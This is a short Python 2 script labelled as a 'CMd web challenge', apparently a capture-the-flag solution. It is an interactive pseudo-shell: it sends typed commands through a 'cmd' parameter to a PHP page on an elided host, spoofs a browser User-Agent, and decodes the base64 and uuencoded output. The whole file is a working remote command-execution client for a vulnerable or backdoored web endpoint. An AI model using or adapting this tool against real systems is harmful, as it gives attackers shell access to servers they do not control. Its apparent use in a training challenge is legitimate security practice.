#CMd web challenge
import urllib
import urllib2
import sys
import base64
while(1):
	cmd = raw_input("root@mtucx: ")
	url = "http://...../index.php?cmd="+urllib.quote(cmd)
	opener = urllib2.build_opener(urllib2.HTTPHandler)
	request = urllib2.Request(url)
	request.add_header('User-Agent', 'Mozilla/5.0')
	request.add_header('Cookie', 'PHPSESSID=')
	request.get_method = lambda:'GET'
	data = opener.open(request)
	data = data.read()
	data = base64.b64decode(data)
	data = "666 <data>\n"+data+"\n \nend\n"
	print data.decode('uu')
	print ""
